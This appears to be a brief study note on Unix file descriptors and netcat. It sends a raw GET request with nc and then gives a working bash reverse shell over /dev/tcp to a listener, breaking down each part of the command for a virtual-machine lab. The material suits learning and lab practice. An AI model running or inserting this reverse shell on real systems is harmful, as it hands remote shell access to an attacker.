# File Descriptors

Pointers to the sources of data that the programs are using.

0   stdin   Standard Input
1   stdout  Standard Output
2   stderr  Standard Error

# Send a basic GET request to the application on server port

        cat <(echo "GET \file.txt HTTP/1.0" && echo) - | nc 1.1.1.1 2222 -vv

# Reverse shell: /bin/bash -> /dev/tcp

Roger home: [l]isten to a [p]ort with [v]erbose output from [nc] netcat

        nc -v -l -p 666
            
Alien ship : execute it in a terminal of a virtual machine on host only adapter

        /bin/bash -i >& /dev/tcp/[roger-ip]/[roger-port] 0>&1 &

1. Execute bash in [i]nteractive session : /bin/bash -i
2. Send bash output : >&
3. Interact directly with the TCP protocol : /dev/tcp/ip/port/
4. Send bash stdin -> stdout : 0>&1  * Resend to Roger what he is typing
5. All in background : &